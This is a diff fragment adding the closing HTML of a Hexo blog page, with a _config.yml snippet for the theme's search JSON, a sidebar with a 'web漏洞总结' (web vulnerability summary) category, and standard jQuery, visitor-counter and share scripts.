+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="web漏洞总结"><span class="iconfont-archer">&#xe60a;</span>web漏洞总结</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "YYK"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
